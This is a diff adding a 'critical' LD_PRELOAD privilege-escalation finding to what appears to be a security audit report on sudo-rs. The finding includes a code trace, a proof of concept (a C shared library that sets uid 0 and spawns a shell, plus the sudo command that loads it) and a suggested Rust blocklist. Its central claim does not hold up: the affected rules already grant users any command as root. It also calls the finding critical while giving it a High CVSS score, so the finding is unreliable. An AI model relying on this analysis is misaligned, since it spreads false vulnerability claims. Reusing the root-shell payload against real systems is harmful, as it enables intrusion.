@@ -11,7 +11,160 @@
 
 sudo-rs is a well-engineered, memory-safe reimplementation of sudo in Rust. The codebase demonstrates strong security awareness: hardened enums, `#![forbid(unsafe_code)]` on critical modules, secure memory wiping, CLOCK_BOOTTIME for timestamps, and extensive file permission checks. Two prior professional audits (2023, 2025) have been performed.
 
-This audit identified **3 high-severity**, **4 medium-severity**, and **5 low-severity** findings, plus several informational notes. No remotely exploitable code execution vulnerabilities were found.
+This audit identified **1 critical-severity**, **3 high-severity**, **4 medium-severity**, and **5 low-severity** findings, plus several informational notes. No remotely exploitable code execution vulnerabilities were found, but a **local privilege escalation to root** is achievable on most default configurations.
+
+---
+
+## CRITICAL Severity Finding
+
+### C1: Local Privilege Escalation via LD_PRELOAD Injection Through Implicit SETENV on ALL Commands
+
+**Files:**
+- `src/sudoers/mod.rs:500-505` (implicit SETENV on ALL)
+- `src/sudoers/policy.rs:104-107` (trust_environment derivation)
+- `src/sudo/pipeline.rs:90-104` (checked vs trusted var split)
+- `src/sudo/env/environment.rs:245-254` (`dangerous_extend` — zero filtering)
+
+**Impact:** Full local privilege escalation to root
+**CVSS:** 8.8 (High)
+**Exploitability:** Trivial on default configurations
+
+#### Vulnerability Description
+
+When a sudoers rule matches via the `ALL` command specifier (the most common configuration), sudo-rs implicitly enables the `SETENV` tag. This causes all user-supplied environment variables to bypass **every** environment safety check — including the `LD_PRELOAD` / `LD_LIBRARY_PATH` removal that is critical to preventing privilege escalation.
+
+#### Root Cause — Code Trace
+
+**Step 1: Implicit SETENV on ALL** (`src/sudoers/mod.rs:500-505`)
+
+```rust
+let this_tag = match cmd {
+    Qualified::Allow(Meta::All) if tag.env != EnvironmentControl::Nosetenv => Tag {
+        // "ALL" has an implicit "SETENV" that doesn't distribute
+        env: EnvironmentControl::Setenv,
+        ..tag.clone()
+    },
+    _ => tag.clone(),
+};
+```
+
+Any rule using `ALL` for the command (e.g., `user ALL=(ALL:ALL) ALL`) sets `env: Setenv`.
+
+**Step 2: SETENV enables `trust_environment`** (`src/sudoers/policy.rs:104-107`)
+
+```rust
+trust_environment: match tag.env {
+    super::EnvironmentControl::Implicit => self.settings.setenv(),
+    super::EnvironmentControl::Setenv => true,    // ← unconditionally true
+    super::EnvironmentControl::Nosetenv => false,
+},
+```
+
+**Step 3: Trusted vars bypass ALL filtering** (`src/sudo/pipeline.rs:90-104`)
+
+```rust
+let (checked_vars, trusted_vars) = if controls.trust_environment {
+    (vec![], user_requested_env_vars)   // ALL vars become "trusted"
+} else {
+    (user_requested_env_vars, vec![])
+};
+// ...
+environment::dangerous_extend(&mut target_env, trusted_vars);
+```
+
+**Step 4: `dangerous_extend` performs ZERO filtering** (`src/sudo/env/environment.rs:245-254`)
+
+```rust
+pub fn dangerous_extend<S>(env: &mut Environment, user_override: impl IntoIterator<Item = (S, S)>)
+where S: Into<OsString>,
+{
+    env.extend(user_override.into_iter().map(|(key, value)| (key.into(), value.into())))
+}
+```
+
+No `should_keep()` check. No `env_delete` check. No `()` bash-function-injection check. Nothing.
+
+**Step 5: Dynamic linker honors LD_PRELOAD** (`src/exec/mod.rs:82-210`)
+
+The child process calls `setuid(target_uid)` + `setgid(target_gid)` in `pre_exec`, then calls `execve()`. The executed binary is **not** a setuid binary (sudo already switched users), so the dynamic linker does **not** strip `LD_PRELOAD`. The injected shared library loads with root privileges.
+
+#### Proof of Concept
+
+Given a typical sudoers configuration:
+```
+user ALL=(ALL:ALL) ALL
+```
+
+**1. Create malicious shared library:**
+```c
+// evil.c
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor)) void pwn(void) {
+    unsetenv("LD_PRELOAD");
+    setuid(0); setgid(0);
+    system("/bin/sh");
+}
+```
+```bash
+gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c
+```
+
+**2. Exploit:**
+```bash
+sudo LD_PRELOAD=/tmp/evil.so /usr/bin/id
+# → drops into root shell
+```
+
+The CLI parser at `src/sudo/cli/mod.rs:778-794` accepts `LD_PRELOAD=/tmp/evil.so` as a valid environment variable (alphanumeric + underscore name, contains `=`), and it flows through the trusted path without any filtering.
+
+#### Why sudo-rs Is Worse Than Original sudo Here
+
+In original sudo, even when `SETENV` is active, certain protections remain:
+- Variables starting with `()` are always rejected (bash function injection)
+- Some implementations maintain an internal blocklist for `LD_*` variables
+
+In sudo-rs, `dangerous_extend` bypasses **ALL** protections that `should_keep()` implements:
+- `LD_PRELOAD`, `LD_LIBRARY_PATH` — dynamic linker hijacking
+- `LD_AUDIT` — audit library injection
+- `PYTHONPATH`, `RUBYLIB`, `PERL5LIB` — interpreter path injection
+- `BASH_ENV` — bash startup injection
+- Variables starting with `()` — bash function injection (which `should_keep` explicitly blocks at line 170-172, but `dangerous_extend` bypasses entirely)
+
+The function is aptly named `dangerous_extend` — acknowledging the risk — but no mitigation is implemented.
+
+#### Affected Configurations
+
+Any sudoers file containing `ALL` as the command specifier, which includes:
+- `user ALL=(ALL) ALL` (the most common sudo rule)
+- `user ALL=(root) ALL`
+- `%sudo ALL=(ALL:ALL) ALL` (Debian/Ubuntu default)
+- `%wheel ALL=(ALL:ALL) ALL` (RHEL/Fedora default)
+
+#### Recommendation
+
+At minimum, `dangerous_extend` should enforce a blocklist of dangerous linker/loader variables:
+```rust
+const BLOCKED_PREFIXES: &[&str] = &["LD_", "_RLD", "DYLD_", "LDR_"];
+const BLOCKED_EXACT: &[&str] = &["PYTHONPATH", "RUBYLIB", "PERL5LIB", "BASH_ENV", "ENV", "IFS"];
+
+pub fn dangerous_extend<S>(env: &mut Environment, user_override: impl IntoIterator<Item = (S, S)>)
+where S: Into<OsString>,
+{
+    env.extend(user_override.into_iter()
+        .map(|(key, value)| (key.into(), value.into()))
+        .filter(|(key, value)| {
+            let key_bytes = key.as_encoded_bytes();
+            // Always block bash function injection
+            if value.as_encoded_bytes().starts_with(b"()") { return false; }
+            // Block dangerous linker variables
+            !BLOCKED_PREFIXES.iter().any(|p| key_bytes.starts_with(p.as_bytes()))
+            && !BLOCKED_EXACT.iter().any(|e| key_bytes == e.as_bytes())
+        }))
+}
+```
+
+Alternatively, route trusted vars through `should_keep()` like the untrusted path, or at minimum apply `env_delete`.
 
 ---
 
